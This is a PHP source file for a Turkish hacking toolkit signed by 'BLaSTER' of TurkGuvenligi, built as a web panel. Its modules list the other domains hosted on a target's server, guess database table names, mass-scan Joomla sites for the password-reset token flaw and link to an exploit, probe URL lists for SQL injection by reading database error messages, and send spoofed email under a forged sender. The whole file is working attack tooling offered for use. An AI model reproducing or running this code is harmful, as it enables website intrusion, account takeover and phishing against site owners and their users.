<?PHP
/*
Kodlama by BLaSTER
from TurkGuvenligi
*/
ini_set('max_execution_time',0);
ob_start();
$tablo = "admin
admins
users
uyeler
uye
kullanici
kullanicilar
member
members
haber
haberler
anket
administrator
editor
editors
webmaster
diary
admin
a_admin
x_admin
m_admin
adminuser
admin_user
adm
article_admin
administrator
manage
manager
member
memberlist
tbluser
tbl_user
tbl_users
user
users
userinfo
user_info
admin_userinfo
userlist
user_list
login
reguser
movie
movies
news
password
clubconfig
config
company
book
art
bbs
dv_admin
webmaster";
?>
<style type="text/css">
<!--
body,td,th {
color: #FFFFFF;
font-family: tahoma;
font-size: 11px;
}
body {
background-color: #000000;
}
.style4 {font-weight: bold}
a:link {
color: #CCCCCC;
}
a:visited {
color: #CCCCCC;
}
a:hover {
color: #666666;
}
a:active {
color: #CCCCCC;
}
-->
table{border:1px solid #FFFFFF;}
tr{border:1px solid #FFFFFF;}
td{border:1px solid #FFFFFF;}
input{background-color:#CCCCCC;
font-family:Georgia, "Times New Roman", Times, serif;
color:#000000;
border:1px dashed #FFFFFF;
font-size:12px;}
textarea{background-color:#CCCCCC;
font-family:Georgia, "Times New Roman", Times, serif;
color:#000000;
border:1px dashed #FFFFFF;
font-size:12px;}
.style6 {
font-size: 24px;
font-weight: bold;
font-style: italic;
}
</style>
<title>BLaSTER</title>

  <div align="center">
    <table width="887" border="1">
      <tr>
        <td height="50" colspan="3"><div align="center"><span class="style6">By BLaSTER</span><br />
          TurkGuvenligi Ekibi<br />
          <br />
        <a href="<?=$_SERVER['PHP_SELF']?>">sayfayi tekrar aç</a></div></td>
      </tr>
      <tr>
        <td width="275" valign="top"><form action="" method="post" name="reverse" id="form1">
            <p><strong>Server listeleyici</strong><br />
              <br />
              <input name="site" type=text size="40">
              <input type="submit" value="Tara">
              <br />
              <?PHP
$site=$_POST['site'];
if($site){
$ch=curl_init();
curl_setopt($ch,CURLOPT_URL,"http://www.guerrilladns.com/index.php");
curl_setopt($ch,CURLOPT_RETURNTRANSFER,TRUE);
curl_setopt($ch,CURLOPT_POST,1);
curl_setopt($ch,CURLOPT_POSTFIELDS,"domain=".$site);
$al=curl_exec($ch);
curl_close($ch);

preg_match_all('#rel="nofollow" >(.*?)</a>#si',$al,$ver);


foreach($ver[1] as $cikti){
ob_flush();
flush();
usleep(100000);
echo $cikti.'<br>';
}
}
?>
            </p>
        </form></td>
        <td width="282" height="100" valign="top" bordercolor="#FFFFFF"><form method="post" action="">
          <form action="" method="post" name="form1" id="form1">
            <p><strong>Tablo bulucu<br />
              </strong><br />
              Site:
              <input name="site2" type="text" id="site" size="45" />
              <br />
              <br />
              Referans olacak kodu giriniz:
              <input name="refkod" type="text" id="refkod" value="cannot find the input table or query" size="40" />
            </p>
            <label><br />
            <textarea name="tablo" cols="50" rows="3" id="tablo"><?=$tablo?>
            </textarea>
            </label>
            <label> <br />
            <input name="submit1" type="submit" id="submit1" value="Ara ve bul" />
            </label>
            <br />
            <?PHP
$tablo=htmlspecialchars($_POST['tablo']);
$site=$_POST['site'];
$refkod=$_POST['refkod'];
if($site && $tablo && $refkod){
$satirlar=explode("\n",$tablo);
foreach($satirlar as $s){
$son = $site." ".$s;
$son2 = str_replace(" ","+",$son);
$son3 = trim($son2);
ob_flush();
flush();
usleep(100000);
$ch=curl_init();
curl_setopt($ch,CURLOPT_RETURNTRANSFER,TRUE);
curl_setopt($ch,CURLOPT_URL,$son3);
$al=curl_exec($ch);
curl_close($ch);
if(eregi($refkod,$al)){
echo $s . '--> <font color="red">yok</font><br>' ;
}else{
echo $s . '--> <font color="green">var</font><br>' ;}
}
}
?>
          </form></td>
        <td width="308" valign="top" bordercolor="#FFFFFF"><form action="" method="post" name="form2" id="form2">
          <p>
            <label></label>
            <label><strong>Hex çevirici <br />
            <br />
            <input name="hex" type="text" id="hex" size="40" />
            </strong></label>
            <strong>
            <input name="submit2" type="submit" id="submit2" value="Çevir" />
            <br />
            <?PHP
  $hex=htmlspecialchars($_POST['hex']);
if($hex){
echo '0x'.bin2hex($hex);
}
  ?>
            </strong></p>
        </form>
            <form action="" method="post" name="form3" id="form3">
              <strong>Ip adresi alici </strong><br />
              <br />
              <label>
                <input name="ip" type="text" id="ip" size="40" />
              </label>
              <label>
                <input name="submit3" type="submit" id="submit3" value="Göster" />
              </label>
              <div align="left">
                <?PHP
$ip=htmlspecialchars($_POST['ip']);
if($ip){
$adres=gethostbyname($ip);
echo '<font color="red">'.$ip.'</font> <br> <font color="green">'.$adres.'</font>';
echo'<br> <a href="http://www.bing.com/search?q=ip%3A'.$adres.'+&go=&form=QBLH&filt=all" target="_blank">Bing arama sayfasini aç</a>';
}
?>
              </div>
            </form>
          <form action="" method="post" name="form6" id="form6">
            <strong>Md5 </strong><br />
            <br />
            <label>
              <input name="md5" type="text" id="md5" size="40" />
            </label>
            <label>
              <input name="submit4" type="submit" id="submit4" value="Olustur" />
            </label>
            <span class="style4">
            <div align="left">
              <?PHP
$md5=htmlspecialchars($_POST['md5']);
if($md5){
echo md5($md5);
}
?>
            </div>
            </span>
        </form>      </td>
      </tr>
      <tr>
        <td width="275" height="100" valign="top" bordercolor="#FFFFFF"><form action="" method="post" name="form5" id="form5">
          <p><strong>Joomla token<br />
                <br />
            </strong>
              <textarea name="liste2" cols="50" rows="8"></textarea>
              <br />
              <input name="submit6" type="submit" id="submit6" value="Taramaya basla" />
              <br />
              <?PHP
$liste=htmlspecialchars($_POST['liste2']);
if($liste){
$satirlar=explode("\n",$liste);
foreach($satirlar as $s){
ob_flush();
flush();
usleep(100000);
$cikti=trim($s);
$ekle="/index.php?option=com_user&view=reset&layout=confirm";
$bla=$cikti."".$ekle;
$ch=curl_init();
curl_setopt($ch,CURLOPT_RETURNTRANSFER,TRUE);
curl_setopt($ch,CURLOPT_URL,$bla);
$al=curl_exec($ch);
curl_close($ch);
if(eregi('token',$al)){
echo '<font color="green">'.$cikti.'</font> --> <font color="green"><a href="http://'.$bla.'" target="_blank">exploit</a></font><br>';
}else{
echo $cikti.' --> <font color="red">yok</font><br>';
}}
}
?>
          </p>
        </form></td>
        <td height="100" valign="top" bordercolor="#FFFFFF"><form action="" method="post" name="form4" id="form4">
          <p><strong>SQL injection tarama</strong><br />
              <br />
              <textarea name="liste1" cols="50" rows="8"></textarea>
              <input name="submit5" type="submit" id="submit5" value="Taramaya basla" />
              <br />
              <?PHP
$liste=htmlspecialchars($_POST['liste1']);
if($liste){
$satirlar=explode("\n",$liste);
foreach($satirlar as $s){
$tmz=trim($s);
$son=$tmz.""."1'a";
ob_flush();
flush();
usleep(100000);
$ch=curl_init();
curl_setopt($ch,CURLOPT_RETURNTRANSFER,TRUE);
curl_setopt($ch,CURLOPT_URL,$son);
$al=curl_exec($ch);
curl_close($ch);
if(eregi("Unclosed",$al)){
echo $son.' <br> <font color="green">MSSQL</font><br>';
}
elseif(eregi("SQL syntax",$al)){
echo $son.' <br> <font color="green">MySQL</font><br>';
}
elseif(eregi("MySQL",$al)){
echo $son.' <br> <font color="green">MySQL</font><br>';
}
elseif(eregi("Syntax error",$al)){
echo $son.' <br> <font color="green">Access</font><br>';
}
elseif(eregi("Access",$al)){
echo $son.' <br> <font color="green">Access</font><br>';
}
elseif(eregi("JET Database",$al)){
echo $son.' <br> <font color="green">Jet Db</font><br>';
}else{
echo $son.' <br> <font color="red">Yok</font><br>';
}}
}
?>
          </p>
        </form></td>
        <td width="275" height="100" valign="top" bordercolor="#FFFFFF"><form id="form7" name="form7" method="post" action="">
          <strong>Fake Mail</strong>
          <p>Gönderen email:
            <label>
              <input name="kim" type="text" id="kim" size="33" />
              </label>
              <br />
            Gönderen isim:
            <input name="isim" type="text" id="isim" size="33" />
            <br />
            Gidecek email:
            <input name="kime" type="text" id="kime" size="33" />
            <br />
            Baslik:
            <input name="baslik" type="text" id="baslik" size="33" />
            <textarea name="icerik" cols="50" rows="8" id="icerik"></textarea>
            <br />
            <input name="submit62" type="submit" id="submit62" value="Gönder" />
            <br />
            <?PHP
$kim=$_POST['kim'];
$kime=$_POST['kime'];
$isim=$_POST['isim'];
$baslik=$_POST['baslik'];
$icerik=$_POST['icerik'];
if($kim && $kime && $isim && $baslik && $icerik){
$gonder=mail($kime, $baslik, $icerik, "From: ".$isim." <".$kim.">");
if($gonder){echo'<script>alert("gonderildi..");</script>';}else{echo'<script>alert("uzgunum bi hata olustu..");</script>';}
}
?>
          </p>
        </form></td>
      </tr>
      <tr>
        <td height="42" colspan="3" valign="bottom" bordercolor="#FFFFFF"><div align="center">
          <p>kodlama by <a href="mailto:priv8coder@gmail.com">BLaSTER</a><br />
            Thehacker - Agd_Scorp - BLaSTER - Cr@zy_King - KinSize - JeXToXiC - s3f4 - rx5 <br />
  "Hakim beye söyledik, biz suça meyilli insanlariz.."</p>
          </div>          <div align="center"></div>          <div align="center"></div></td>
      </tr>
    </table>
  </div>